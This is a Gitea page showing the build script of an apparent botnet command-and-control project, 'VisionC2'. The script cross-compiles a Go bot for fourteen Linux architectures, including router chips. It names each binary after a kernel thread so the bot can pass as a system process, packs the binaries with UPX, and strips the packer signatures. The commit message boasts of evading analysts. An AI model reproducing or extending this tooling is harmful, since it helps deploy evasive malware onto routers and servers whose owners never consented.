
Logo
Issues
Pull Requests
Milestones
Explore
hell
/
VisionC2
Private
Code
Issues
Pull Requests
Actions
Packages
Projects
Releases
Wiki
Activity
Settings
VisionC2
/tools/build.sh
[hell] hell
8f42b8d72b
swithc bin names, damn anaylist!!
54 minutes ago
125 lines
5.5 KiB
Bash
Executable File
#!/bin/bash

# Sins Custom legiatmate Name Builder 
# yes we are using UPX (GO is large) reducing file size from 8mb to 2mb here.
# UPX headers will be stripped automatically by deUPX.py.

# ======================== BINARY ARCHITECTURE MAPPING ========================
# Build for all architectures - each gets a different binary name from AMBS array
# 
# BINARY NAME    | ARCHITECTURE    | GOOS  | GOARCH | GOARM | COMMENTS
# ---------------|-----------------|-------|--------|-------|-------------------
# ksoftirqd0     | x86 (386)       | linux | 386    |       | 32-bit Intel/AMD
# kworker_u8     | x86_64          | linux | amd64  |       | 64-bit Intel/AMD
# jbd2_sda1d     | ARMv7           | linux | arm    | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)
# bioset0        | ARMv5           | linux | arm    | 5     | ARM 32-bit v5 (older ARM)
# kblockd0       | ARMv6           | linux | arm    | 6     | ARM 32-bit v6 (Raspberry Pi 1)
# rcuop_0        | ARM64           | linux | arm64  |       | ARM 64-bit (Raspberry Pi 4, Android)
# kswapd0        | MIPS            | linux | mips   |       | MIPS big-endian (routers)
# ecryptfsd      | MIPSLE          | linux | mipsle |       | MIPS little-endian
# xfsaild_sda    | MIPS64          | linux | mips64 |       | MIPS 64-bit big-endian
# scsi_tmf_0     | MIPS64LE        | linux | mips64le |     | MIPS 64-bit little-endian
# devfreq_wq     | PPC64           | linux | ppc64  |       | PowerPC 64-bit big-endian
# zswap_shrinkd  | PPC64LE         | linux | ppc64le |      | PowerPC 64-bit little-endian
# edac_polld     | s390x           | linux | s390x  |       | IBM System/390 64-bit
# cfg80211d      | RISC-V 64       | linux | riscv64|       | RISC-V 64-bit

# Get the directory where this script is located (tools/)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Project root is one level up from tools/
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Find Go binary — prefer /usr/local/go/bin/go over system PATH
if [ -x "/usr/local/go/bin/go" ]; then
    GO_BIN="/usr/local/go/bin/go"
else
    GO_BIN="go"
fi
echo "Using Go: $GO_BIN ($($GO_BIN version 2>/dev/null))"

# Array of binary names to use for obfuscation (disguised as kernel/system processes)
AMBS=("ksoftirqd0" "kworker_u8" "jbd2_sda1d" "bioset0" "kblockd0"
      "rcuop_0" "kswapd0" "ecryptfsd" "xfsaild_sda" "scsi_tmf_0" "devfreq_wq"
      "zswap_shrinkd" "edac_polld" "cfg80211d")

# Create bins folder in project root if it doesn't exist
BINS_DIR="$PROJECT_ROOT/bins"
mkdir -p "$BINS_DIR"

# Counter for AMBS array
INDEX=0

# Function to build for a specific architecture
build_for_arch() {
    local arch_name="$1"   # Human-readable architecture name
    local goos="$2"        # GOOS value (operating system)
    local goarch="$3"      # GOARCH value (architecture)
    local goarm="$4"       # GOARM value (only for ARM)
    
    echo -e "\nBuilding for $arch_name..."
    
    local OUTPUT="$BINS_DIR/${AMBS[$INDEX]}"
    
    cd "$PROJECT_ROOT"
    
    if [ -n "$goarm" ]; then
        # ARM architectures require GOARM setting
        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
    else
        GOOS="$goos" GOARCH="$goarch" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
    fi
    
    # Check if build succeeded
    if [ ! -f "$OUTPUT" ]; then
        echo "ERROR: Build failed for $arch_name"
        return 1
    fi
    
    # Strip symbols (safe size reduction)
    if command -v strip &> /dev/null; then
        strip --strip-all "$OUTPUT" 2>/dev/null || echo "strip failed for $arch_name"
    fi

    # Compress the binary with UPX (bundled in tools/)
    # Using --best --lzma for good compression without ultra-brute slowness
    local UPX_BIN="$SCRIPT_DIR/upx"
    if [ -x "$UPX_BIN" ]; then
        "$UPX_BIN" --best --lzma "$OUTPUT" 2>/dev/null || \
        "$UPX_BIN" -9 "$OUTPUT" 2>/dev/null || \
        echo "UPX compression skipped for $arch_name"
    else
        echo "ERROR: UPX binary not found at $UPX_BIN"
        echo "       Download it: curl -sL https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-amd64_linux.tar.xz | tar -xJ --strip-components=1 -C $SCRIPT_DIR upx-4.2.4-amd64_linux/upx"
    fi
    INDEX=$((INDEX + 1))
}

# Build for all architectures
build_for_arch "x86 (386)" "linux" "386"         # ksoftirqd0
build_for_arch "x86_64" "linux" "amd64"          # kworker_u8
build_for_arch "ARMv7" "linux" "arm" "7"         # jbd2_sda1d
build_for_arch "ARMv5" "linux" "arm" "5"         # bioset0
build_for_arch "ARMv6" "linux" "arm" "6"         # kblockd0
build_for_arch "ARM64" "linux" "arm64"           # rcuop_0
build_for_arch "MIPS" "linux" "mips"             # kswapd0
build_for_arch "MIPSLE" "linux" "mipsle"         # ecryptfsd
build_for_arch "MIPS64" "linux" "mips64"         # xfsaild_sda
build_for_arch "MIPS64LE" "linux" "mips64le"     # scsi_tmf_0
build_for_arch "PPC64" "linux" "ppc64"           # devfreq_wq
build_for_arch "PPC64LE" "linux" "ppc64le"       # zswap_shrinkd
build_for_arch "s390x" "linux" "s390x"           # edac_polld
build_for_arch "RISC-V 64" "linux" "riscv64"     # cfg80211d

echo -e "\nAll 14 builds complete!"
echo "Built binaries saved to $BINS_DIR/:"
ls -la "$BINS_DIR/"

# Strip UPX signatures from packed binaries using deUPX.py
echo -e "\nStripping UPX signatures from binaries..."
if [ -f "$SCRIPT_DIR/deUPX.py" ]; then
    python3 "$SCRIPT_DIR/deUPX.py" "$BINS_DIR/"
    echo -e "\nUPX signatures stripped successfully!"
else
    echo "WARNING: deUPX.py not found at $SCRIPT_DIR/deUPX.py - skipping UPX stripping"
fi
Powered by Gitea
Version:
1.22.6
Page:
265ms
Template:
242ms
Licenses
API
